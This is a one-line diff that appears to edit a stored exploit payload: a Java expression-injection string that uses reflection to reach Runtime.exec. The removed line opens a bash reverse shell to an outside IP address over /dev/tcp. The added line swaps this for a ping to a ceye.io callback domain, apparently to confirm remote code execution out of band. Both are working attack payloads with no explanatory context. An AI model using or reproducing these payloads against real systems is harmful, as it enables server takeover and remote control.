@@ -1,1 +1,1 @@
-$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -i >& /dev/tcp/172.25.32.96/8090 0>&1').waitFor()
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ping vm.ek8fvk.ceye.io').waitFor()
